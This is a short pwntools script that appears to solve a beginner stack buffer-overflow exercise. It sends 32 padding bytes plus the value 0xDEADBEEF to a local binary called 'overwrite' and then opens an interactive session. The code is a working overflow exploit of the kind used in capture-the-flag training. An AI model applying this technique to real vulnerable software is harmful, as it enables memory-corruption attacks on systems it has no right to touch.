from pwn import *

buff = b"A"*32
buff+= p32(0xDEADBEEF) 


p = process("./overwrite")


p.recvuntil("? ")

p.sendline(buff)

p.interactive()